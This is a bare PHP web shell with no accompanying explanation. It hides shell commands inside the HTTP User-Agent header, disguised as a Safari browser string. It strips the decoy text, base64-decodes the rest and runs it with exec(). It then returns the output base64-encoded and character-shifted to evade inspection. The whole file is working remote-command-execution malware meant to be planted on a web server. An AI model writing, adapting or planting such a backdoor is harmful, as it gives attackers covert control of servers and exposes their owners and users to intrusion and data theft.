<?php
$dd = $_SERVER['HTTP_USER_AGENT'];
$dd = str_replace("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_ Version/5.1 Safari/534.50", "", $dd);
$dd = str_replace("6_8; en-us) AppleWebKit/53", "", $dd);
$dd = str_replace("4.50 (KHTML, like Gecko)", "", $dd);
$qq = base64_decode($dd);
$jjj = exec ($qq,$out);
for ($i=0 ;$i < count($out) ;$i++){
    $ls = $ls.$out[$i]."\n";
}
function xxx($string_1)
{
	#echo strlen($string_1);
	for ($j=0 ;$j < strlen($string_1) ;$j++){
		$string_1[$j] = chr(ord($string_1[$j])+1);
    	$ls_1 = $ls_1.$string_1[$j];
	}
	return $ls_1;
}
$ls = base64_encode($ls);
$ls = xxx($ls);
echo $ls;
?>